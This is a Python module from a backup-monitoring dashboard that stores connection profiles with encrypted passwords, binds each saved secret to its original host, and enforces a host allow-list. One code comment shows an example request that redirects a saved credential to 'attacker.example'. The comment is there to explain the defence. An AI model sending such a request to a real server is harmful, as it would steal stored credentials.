"""Connection profiles, host allow-list, and API config payload parsing.

Split from networker_dashboard.py (v2.5.0); behavior unchanged.
"""
from __future__ import annotations

import json
import ipaddress
import socket
import threading
from typing import Any
from urllib.parse import urlparse

from . import config as _cfg
from .config import (
    API_VERSION_PATTERN,
    CUSTOM_REPORT_RANGE,
    DATA_DIR,
    DEFAULT_API_PORT,
    DEFAULT_REPORT_RANGE,
    DEFAULT_TIMEOUT_SECONDS,
    HOST_PATTERN,
    LOG,
    PROFILES_FILE,
    REPORT_RANGES,
    _PROFILE_PW_SAVED,
    _PROFILE_PW_SENTINEL,
    safe_log_text,
)
from .secrets import (
    decrypt_profile_secret,
    encrypt_profile_secret,
    profile_secret_needs_rebinding,
)
from .models import ApiConfig, BadRequest

# ── Connection profiles ───────────────────────────────────────────────────────
PROFILES_LOCK = threading.Lock()
SNAPSHOTS_LOCK = threading.Lock()


def load_profiles() -> dict[str, Any]:
    try:
        if PROFILES_FILE.exists():
            return json.loads(PROFILES_FILE.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError):
        pass
    return {}


def save_profiles(profiles: dict[str, Any]) -> None:
    """Persist profiles. Raises OSError if the write fails — swallowing it let the
    UI report "Profile saved" for a save that never reached disk."""
    try:
        DATA_DIR.mkdir(parents=True, exist_ok=True)
        tmp = PROFILES_FILE.with_suffix(".tmp")
        tmp.write_text(json.dumps(profiles, separators=(",", ":")), encoding="utf-8")
        tmp.replace(PROFILES_FILE)
    except OSError as exc:
        LOG.error(f"could not write {PROFILES_FILE.name}: {exc}", extra={"event": "profiles_write_failed"})
        raise


def _mask_profiles(profiles: dict[str, Any]) -> dict[str, Any]:
    """Return profiles safe to send to browser — encrypted blobs replaced with sentinel."""
    masked = {}
    for name, prof in profiles.items():
        m = dict(prof)
        if m.pop("_enc_password", ""):
            m["password"] = _PROFILE_PW_SAVED
        if m.pop("_enc_wmiPassword", ""):
            m["wmiPassword"] = _PROFILE_PW_SAVED
        masked[name] = m
    return masked


# ── Profile secret <-> destination binding ────────────────────────────────────
# A saved profile's secret may only ever travel to the connection that profile
# was saved for. These fields therefore come from the STORED profile as one
# unit and are never taken from the request (cf. RUCKUS
# auth/profiles.py::to_connection_form, which hands back the whole stored form).
#
# Without this, an authenticated user — or a successful CSRF — could post
#   {"profileName": "prod-nw", "restApiHost": "attacker.example", "password": "__profile_password__"}
# and the server would decrypt the production NetWorker credential and send it
# straight to attacker.example. The host allow-list is the only other guard and
# it is off by default ("If unset, any host is permitted", main.py --allowed-hosts).
_BOUND_FIELD_LABELS: dict[str, str] = {
    "restApiHost": "REST API server",
    "restApiPort": "REST API port",
    "backupServerHost": "Backup server",
    "backupServerPort": "AuthC port",
    "username": "Username",
    "verifyTls": "Verify TLS",
}
_SENTINELS = (_PROFILE_PW_SENTINEL, _PROFILE_PW_SAVED)


def _connection_target(source: dict[str, Any]) -> dict[str, Any]:
    """Normalize the destination a payload or a stored profile describes, so the
    two can be compared regardless of how the host was spelled ('h', 'h:9090',
    'https://h:9090') or whether ports arrived as strings."""
    rest_host, rest_embedded = parse_host(source.get("restApiHost"), "REST API server")
    rest_port = parse_port(source.get("restApiPort") or rest_embedded, DEFAULT_API_PORT, "REST API port")
    backup_raw = str(source.get("backupServerHost") or "").strip()
    if backup_raw:
        backup_host, backup_embedded = parse_host(backup_raw, "Backup server")
    else:
        backup_host, backup_embedded = rest_host, None
    backup_port = parse_port(source.get("backupServerPort") or backup_embedded, DEFAULT_API_PORT, "AuthC port")
    return {
        "restApiHost": _normalize_host(rest_host),
        "restApiPort": rest_port,
        "backupServerHost": _normalize_host(backup_host),
        "backupServerPort": backup_port,
        "username": str(source.get("username") or "").strip(),
        # A request must not be able to turn TLS verification off for a stored
        # credential: that would expose it to anyone on the path to the host.
        "verifyTls": bool(source.get("verifyTls", True)),
    }


def profile_connection_form(profile_name: str, profiles: dict[str, Any]) -> dict[str, Any] | None:
    """The stored profile's destination + credentials as ONE unit, or None when
    no such profile exists. Analogue of RUCKUS's to_connection_form: the caller
    gets the whole saved form, never a stored secret it can re-aim."""
    prof = profiles.get(profile_name)
    if not isinstance(prof, dict):
        return None
    try:
        form = _connection_target(prof)
    except BadRequest as exc:
        raise BadRequest(
            f"Saved profile '{profile_name}' stores an unusable connection ({exc}). "
            "Re-save the profile."
        ) from exc
    # Profiles saved before verifyTls existed cannot be held to a value they
    # never recorded — bind it only when the profile actually specifies it.
    form["_binds_verify_tls"] = "verifyTls" in prof
    form["password"] = decrypt_profile_secret(
        str(prof.get("_enc_password") or ""), name=profile_name, field="password"
    )
    form["wmiPassword"] = decrypt_profile_secret(
        str(prof.get("_enc_wmiPassword") or ""), name=profile_name, field="wmiPassword"
    )
    form["_has_password"] = bool(prof.get("_enc_password"))
    form["_has_wmi_password"] = bool(prof.get("_enc_wmiPassword"))
    return form


def _resolve_profile_password(payload: dict[str, Any]) -> dict[str, Any]:
    """Substitute a saved profile's stored secrets together with the destination
    they were saved for.

    A stored credential and a caller-supplied destination are never combined. If
    the request asks to send a saved secret anywhere other than that profile's
    own connection, it is refused — the operator must re-enter the password,
    which is the one flow that legitimately targets a different host (a DR pair
    sharing an account, or reusing a profile as a template for a new server).
    Typing a real password bypasses this whole path, so that flow still works.
    """
    profile_name = str(payload.get("profileName") or "").strip()
    pw   = str(payload.get("password")    or "")
    wpw  = str(payload.get("wmiPassword") or "")
    if not profile_name:
        return payload
    wants_password = pw in _SENTINELS
    wants_wmi = wpw in _SENTINELS
    if not wants_password and not wants_wmi:
        # No stored secret is involved — the caller supplied its own credential
        # and may target whatever the allow-list permits.
        return payload

    with PROFILES_LOCK:
        profiles = load_profiles()
    form = profile_connection_form(profile_name, profiles)
    if form is None:
        raise BadRequest(
            f"Saved profile '{profile_name}' was not found on this server. "
            "Re-enter the password to connect."
        )

    bound_keys = [
        key for key in _BOUND_FIELD_LABELS
        if key != "verifyTls" or form["_binds_verify_tls"]
    ]
    requested = _connection_target(payload)
    differing = [
        _BOUND_FIELD_LABELS[key]
        for key in bound_keys
        if requested.get(key) != form.get(key)
    ]
    if differing:
        LOG.warning(
            "refused to send profile '%s' stored credential to a different target "
            "(changed: %s; profile host=%s, requested host=%s)",
            safe_log_text(profile_name, 80),
            ", ".join(differing),
            safe_log_text(form["restApiHost"], 120),
            safe_log_text(requested["restApiHost"], 120),
            extra={"event": "profile_target_mismatch"},
        )
        raise BadRequest(
            f"The password saved with profile '{profile_name}' can only be used with that "
            f"profile's own connection ({form['username']}@{form['restApiHost']}:{form['restApiPort']}). "
            f"This request changed: {', '.join(differing)}. "
            "Re-enter the password to connect to a different target."
        )

    result = dict(payload)
    # Belt and braces: even though the request matched, the destination actually
    # used is read back out of the stored profile, so no comparison gap can put
    # a stored secret on a caller-chosen host.
    for key in bound_keys:
        result[key] = form[key]
    if wants_password:
        if not form["password"]:
            raise BadRequest(_missing_secret_message(profile_name, "password", form["_has_password"]))
        result["password"] = form["password"]
    if wants_wmi:
        if not form["wmiPassword"] and form["_has_wmi_password"]:
            raise BadRequest(_missing_secret_message(profile_name, "WMI password", True))
        result["wmiPassword"] = form["wmiPassword"]
    return result


def _missing_secret_message(profile_name: str, label: str, stored: bool) -> str:
    """Tell the operator what actually went wrong. A failed decrypt used to fall
    through to validate_payload's "Password is required.", which says they forgot
    to type something when in fact the key that would decrypt it is gone."""
    if not stored:
        return f"Profile '{profile_name}' has no saved {label}. Enter it to connect."
    return (
        f"The saved {label} for profile '{profile_name}' could not be decrypted. The key in "
        "data/.session_key is missing, or belongs to another machine or Windows account. "
        f"Re-enter the {label} to connect and save it again."
    )


def migrate_profile_secrets() -> int:
    """Re-encrypt stored profile secrets under the name||field-bound AAD (enc:v2).

    Existing enc:v1 and legacy Fernet blobs keep decrypting, so nothing breaks if
    this never runs; a blob that fails to decrypt is left exactly as it is rather
    than replaced. Returns the number of secrets rebound.
    """
    rebound = 0
    with PROFILES_LOCK:
        profiles = load_profiles()
        for name, prof in profiles.items():
            if not isinstance(prof, dict):
                continue
            for field in ("password", "wmiPassword"):
                stored = str(prof.get(f"_enc_{field}") or "")
                if not profile_secret_needs_rebinding(stored):
                    continue
                plaintext = decrypt_profile_secret(stored, name=name, field=field)
                if not plaintext:
                    LOG.warning(
                        f"profile '{safe_log_text(name, 80)}' {field} could not be decrypted; "
                        "left in its stored form for recovery"
                    )
                    continue
                try:
                    prof[f"_enc_{field}"] = encrypt_profile_secret(plaintext, name=name, field=field)
                except Exception as exc:  # noqa: BLE001 — never lose the old blob over a rewrite
                    LOG.error(f"could not rebind profile '{safe_log_text(name, 80)}' {field}: {exc}")
                    continue
                rebound += 1
        if rebound:
            save_profiles(profiles)
            LOG.info(f"rebound {rebound} stored profile secret(s) to the per-profile AAD (enc:v2)")
    return rebound




def parse_port(value: Any, default: int, field_name: str) -> int:
    if value is None or str(value).strip() == "":
        return default
    try:
        port = int(str(value).strip())
    except ValueError as exc:
        raise BadRequest(f"{field_name} must be a number.") from exc
    if not 1 <= port <= 65535:
        raise BadRequest(f"{field_name} must be between 1 and 65535.")
    return port


ALLOWED_HOST_NAMES: set[str] = set()
ALLOWED_NETWORKS: list[Any] = []
ALLOWED_PINNED_IPS: set[str] = set()


def _normalize_host(host: str) -> str:
    return (host or "").strip().lower().strip("[]")


def _resolve_ips(host: str) -> set[str]:
    try:
        infos = socket.getaddrinfo(host, None)
    except (socket.gaierror, OSError, UnicodeError):
        return set()
    ips: set[str] = set()
    for info in infos:
        sockaddr = info[4]
        if sockaddr and sockaddr[0]:
            ips.add(sockaddr[0])
    return ips


def configure_allowed_hosts(raw: str) -> None:
    """Parse a comma-separated allowlist of hostnames / IPs / CIDRs.
    Hostname entries are resolved once here and their IPs pinned (rebinding guard).
    """
    ALLOWED_HOST_NAMES.clear()
    ALLOWED_NETWORKS.clear()
    ALLOWED_PINNED_IPS.clear()
    for entry in (raw or "").split(","):
        entry = entry.strip()
        if not entry:
            continue
        try:
            ALLOWED_NETWORKS.append(ipaddress.ip_network(entry, strict=False))
            continue
        except ValueError:
            pass
        name = _normalize_host(entry)
        if name:
            ALLOWED_HOST_NAMES.add(name)
            for ip in _resolve_ips(name):
                ALLOWED_PINNED_IPS.add(ip)
    _cfg.ALLOWLIST_ENABLED = bool(ALLOWED_HOST_NAMES or ALLOWED_NETWORKS)


def _ip_in_networks(ip: str) -> bool:
    try:
        addr = ipaddress.ip_address(ip)
    except ValueError:
        return False
    return any(addr in net for net in ALLOWED_NETWORKS)


def _host_allowed(host: str) -> bool:
    if not _cfg.ALLOWLIST_ENABLED:
        return True
    h = _normalize_host(host)
    if not h:
        return False
    try:
        literal_ip = ipaddress.ip_address(h)
    except ValueError:
        literal_ip = None
    if literal_ip is not None:
        return _ip_in_networks(h)
    if h not in ALLOWED_HOST_NAMES:
        return False
    resolved = _resolve_ips(h)
    if not resolved:
        return False
    return all(ip in ALLOWED_PINNED_IPS or _ip_in_networks(ip) for ip in resolved)


def _assert_host_allowed(config: "ApiConfig") -> None:
    for host in {config.rest_api_host, config.backup_server_host or config.rest_api_host}:
        if host and not _host_allowed(host):
            raise BadRequest(f"Host '{host}' is not in the configured allow-list.")


def parse_host(value: Any, field_name: str) -> tuple[str, int | None]:
    raw = str(value or "").strip()
    if not raw:
        raise BadRequest(f"{field_name} is required.")

    embedded_port: int | None = None
    if "://" in raw:
        parsed = urlparse(raw)
        if parsed.scheme.lower() != "https":
            raise BadRequest(f"{field_name} must use HTTPS.")
        host = parsed.hostname or ""
        embedded_port = parsed.port
    else:
        if "/" in raw or "\\" in raw:
            raise BadRequest(f"{field_name} must be a host or IP address, not a path.")
        if raw.startswith("[") and "]" in raw:
            host_part, _, port_part = raw.partition("]")
            host = host_part.strip("[]")
            if port_part.startswith(":") and port_part[1:].isdigit():
                embedded_port = int(port_part[1:])
        elif raw.count(":") == 1 and raw.rsplit(":", 1)[1].isdigit():
            host, port_part = raw.rsplit(":", 1)
            embedded_port = int(port_part)
        else:
            host = raw

    host = host.strip().strip("[]")
    if not host or not HOST_PATTERN.match(host):
        raise BadRequest(f"{field_name} contains unsupported characters.")
    return host, embedded_port


def validate_payload(payload: dict[str, Any]) -> ApiConfig:
    from .restapi import parse_custom_date_window  # late import: avoids circular module import
    rest_api_host, embedded_rest_port = parse_host(payload.get("restApiHost"), "REST API server")
    rest_api_port = parse_port(
        payload.get("restApiPort") or embedded_rest_port,
        DEFAULT_API_PORT,
        "REST API port",
    )

    backup_value = str(payload.get("backupServerHost") or "").strip()
    if backup_value:
        backup_server_host, embedded_backup_port = parse_host(backup_value, "Backup server")
    else:
        backup_server_host = rest_api_host
        embedded_backup_port = None

    backup_server_port = parse_port(
        payload.get("backupServerPort") or embedded_backup_port,
        DEFAULT_API_PORT,
        "AuthC port",
    )

    if _cfg.ALLOWLIST_ENABLED:
        for host in {rest_api_host, backup_server_host}:
            if host and not _host_allowed(host):
                raise BadRequest(f"Host '{host}' is not in the configured allow-list.")

    username = str(payload.get("username") or "").strip()
    password = str(payload.get("password") or "")
    if not username:
        raise BadRequest("Username is required.")
    if not password:
        raise BadRequest("Password is required.")

    api_mode = str(payload.get("apiMode") or "auto").strip().lower()
    if api_mode not in {"auto", "nwui", "rest"}:
        raise BadRequest("API source must be auto, nwui, or rest.")

    api_version = str(payload.get("apiVersion") or "auto").strip().lower()
    if api_version != "auto" and not API_VERSION_PATTERN.match(api_version):
        raise BadRequest("API version must be auto or look like v3.")

    report_range = str(payload.get("reportRange") or DEFAULT_REPORT_RANGE).strip().lower()
    if report_range not in REPORT_RANGES and report_range != CUSTOM_REPORT_RANGE:
        raise BadRequest("Report range must be 24h, 7d, 30d, or custom.")
    custom_start_date = str(payload.get("customStartDate") or "").strip()
    custom_end_date = str(payload.get("customEndDate") or "").strip()
    if report_range == CUSTOM_REPORT_RANGE:
        parse_custom_date_window(custom_start_date, custom_end_date)
    use_wmi_health = bool(payload.get("useWmiHealth", True))
    wmi_username = str(payload.get("wmiUsername") or "").strip()
    wmi_password = str(payload.get("wmiPassword") or "")
    if use_wmi_health and bool(wmi_username) != bool(wmi_password):
        raise BadRequest("WMI username and WMI password must be provided together.")

    timeout_seconds = parse_port(
        payload.get("timeoutSeconds"),
        DEFAULT_TIMEOUT_SECONDS,
        "Timeout seconds",
    )
    timeout_seconds = min(max(timeout_seconds, 5), 120)

    return ApiConfig(
        rest_api_host=rest_api_host,
        rest_api_port=rest_api_port,
        backup_server_host=backup_server_host,
        backup_server_port=backup_server_port,
        username=username,
        password=password,
        api_mode=api_mode,
        api_version=api_version,
        report_range=report_range,
        custom_start_date=custom_start_date,
        custom_end_date=custom_end_date,
        use_wmi_health=use_wmi_health,
        wmi_username=wmi_username,
        wmi_password=wmi_password,
        timeout_seconds=timeout_seconds,
        verify_tls=bool(payload.get("verifyTls", True)),
        use_authc_header=bool(payload.get("useAuthcHeader", False)),
    )
